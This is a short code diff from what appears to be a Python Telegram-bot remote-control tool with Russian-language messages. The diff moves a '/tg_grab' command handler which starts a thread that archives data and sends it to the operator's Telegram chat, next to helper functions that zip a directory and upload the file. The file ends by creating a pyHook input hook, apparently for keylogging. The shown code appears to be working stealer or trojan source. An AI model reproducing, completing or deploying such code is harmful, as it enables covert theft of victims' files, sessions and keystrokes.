@@ -284,20 +284,6 @@ def start(message):
     itembtn11 = types.KeyboardButton('/code')
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
-@bot.message_handler(commands=['tg_grab'])
-def handle_tg_grab_command(message):
-    thread = threading.Thread(target=archive_and_send)
-    thread.start()
-    time.sleep(20)
-    if thread.is_alive():
-        print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
-        thread.join()
-    try:
-        error_message = "ВЫПОЛНЕННО!!!"
-        bot.send_message(chat_id, error_message)
-    except Exception as e:
-        error_message = f"ОШИБКА: {e}"
-        bot.send_message(chat_id, error_message)
 
 def create_zip_archive(source_dir, output_zip):
     try:
@@ -356,7 +342,20 @@ def send_file_to_telegram(file_path, file_name):
         print(f"Error sending file to Telegram. Chat ID: {chat_id}. Status code: {response.status_code}")
         print(response.text)
 
-
+@bot.message_handler(commands=['tg_grab'])
+def handle_tg_grab_command(message):
+    thread = threading.Thread(target=archive_and_send)
+    thread.start()
+    time.sleep(20)
+    if thread.is_alive():
+        print("АРХИВ ЗАГРУЖАЕТСЯ СЛИШКОМ ДОЛГО, ПРИНУДИТЕЛЬНАЯ ОТПРАВКА.")
+        thread.join()
+    try:
+        error_message = "ВЫПОЛНЕННО!!!"
+        bot.send_message(chat_id, error_message)
+    except Exception as e:
+        error_message = f"ОШИБКА: {e}"
+        bot.send_message(chat_id, error_message)
 print('СЛУШАЮ КОМАНДЫ...')
 bot.polling()
 proc = pyHook.HookManager()
